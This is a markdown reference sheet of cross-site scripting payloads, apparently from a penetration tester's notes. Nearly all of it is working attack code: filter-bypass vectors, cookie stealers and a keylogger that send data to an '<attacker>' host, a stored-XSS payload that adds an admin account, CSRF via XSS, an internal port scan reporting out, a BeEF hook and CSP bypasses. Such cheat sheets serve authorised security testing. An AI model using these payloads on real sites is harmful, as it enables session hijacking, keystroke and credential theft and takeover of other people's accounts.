---
tags: [reference, xss, payloads, injection]
---

# XSS Payloads — Reference

> Full XSS guide: [[07-Web-Application/XSS-SSRF-XXE-IDOR]]

## Basic Detection

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'"><svg onload=alert(1)>
javascript:alert(1)
```

## Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- No quotes -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;   ← won't work
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;   ← depends on context

<!-- Broken tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr	ipt>alert(1)</script>

<!-- String concatenation -->
<img src=x onerror="al"+"ert(1)">
<img src=x onerror=eval('al\x65rt(1)')>

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
<a href="java&#x09;script:alert(1)">click</a>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>x</option><option selected>y</option></select>
<form><button formaction=javascript:alert(1)>XSS</button></form>

<!-- SVG vectors -->
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
<svg><set onbegin=alert(1) attributeName=x></svg>
<svg onload=alert(1)><animate>

<!-- Template literals -->
`${alert(1)}`

<!-- Bypass specific filters -->
<img/src=x/onerror=alert(1)>     <!-- slash instead of space -->
<img src="x" onerror="alert(1)"> <!-- quoted attributes -->
```

## Cookie Theft (Session Hijacking)

```html
<!-- Basic cookie stealer -->
<script>document.location='http://<attacker>/steal?c='+document.cookie</script>
<img src=x onerror="new Image().src='http://<attacker>/steal?c='+document.cookie">

<!-- XMLHttpRequest exfil -->
<script>
var x=new XMLHttpRequest();
x.open('GET','http://<attacker>/steal?c='+document.cookie);
x.send();
</script>

<!-- Fetch API -->
<script>fetch('http://<attacker>/steal?c='+encodeURIComponent(document.cookie))</script>
```

## Keylogger

```html
<script>
document.onkeypress=function(e){
  new Image().src='http://<attacker>/keys?k='+e.key;
}
</script>
```

## Stored XSS → Persistent Backdoor

```html
<!-- Add admin user via XSS in admin panel -->
<script>
fetch('/admin/adduser',{
  method:'POST',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'username=hacker&password=P%40ss123&role=admin'
});
</script>

<!-- CSRF via XSS -->
<script>
var f=document.createElement('form');
f.method='POST';f.action='http://<target>/action';
var i=document.createElement('input');
i.name='param';i.value='evil';
f.appendChild(i);document.body.appendChild(f);f.submit();
</script>
```

## DOM XSS

```javascript
// Vulnerable sinks:
document.write()
document.writeln()
innerHTML =
outerHTML =
eval()
setTimeout("string", ...)
setInterval("string", ...)
location = "javascript:..."
document.location.href = ...

// DOM XSS payloads
#<img src=x onerror=alert(1)>    // URL hash (#)
?name=<img src=x onerror=alert(1)>  // DOM via location.search
```

## XSS → SSRF / Internal Port Scan

```javascript
<script>
// Port scan internal network via XSS
for(let port of [22,80,443,3306,6379,8080,8443]){
  var img=new Image();
  img.src='http://127.0.0.1:'+port;
  img.onerror=()=>fetch('http://<attacker>/open?port='+port);
}
</script>
```

## BeEF Hook (Browser Exploitation)

```html
<!-- Hook victim browser -->
<script src="http://<attacker>:3000/hook.js"></script>

<!-- Start BeEF -->
# beef-xss
# Open http://127.0.0.1:3000/ui/panel
```

## CSP Bypass Techniques

```
# Check CSP header
curl -sI http://<target>/ | grep -i content-security-policy

# Bypass via JSONP endpoint
?callback=<script>alert(1)</script>
# If allowed: script-src 'self' trusted.com

# Bypass via open redirect
Location: javascript:alert(1)

# Bypass via dangling markup
<img src='http://attacker/?

# Bypass 'unsafe-eval' via Angular
{{constructor.constructor('alert(1)')()}}
```

## Related

- [[07-Web-Application/XSS-SSRF-XXE-IDOR]] — Full XSS/SSRF/XXE guide
- [[05-Exploitation/Web-Apps]] — Web exploitation overview
